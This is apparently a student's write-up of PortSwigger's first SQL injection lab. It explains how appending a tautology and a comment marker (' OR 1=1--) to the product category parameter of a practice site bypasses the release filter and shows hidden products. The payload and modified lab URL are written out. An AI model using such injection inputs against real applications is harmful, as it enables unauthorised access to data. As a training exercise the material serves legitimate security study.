---
title: Lab 1 SQL Injection - Port Swigger

---

# Lab 1 SQL Injection - Port Swigger

## Statement
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: 

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 

## Solution

We can inject text into the query to bypass the condition `released = 1`. The page link is:

https://0acf003a0407a665c49a09c0008600c2.web-security-academy.net/filter?category=Gifts

The category is included directly in the link, and we can modify the query to:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = `

The text after `--` is interpreted as a comment, so in this case, `AND released = 1 is not processed by SQL.

We need to change the link so that the query is as above:

https://0acf003a0407a665c49a09c0008600c2.web-security-academy.net/filter?category=Gifts'+or+1=1--

Now we can see all products on the page, both released and unreleased.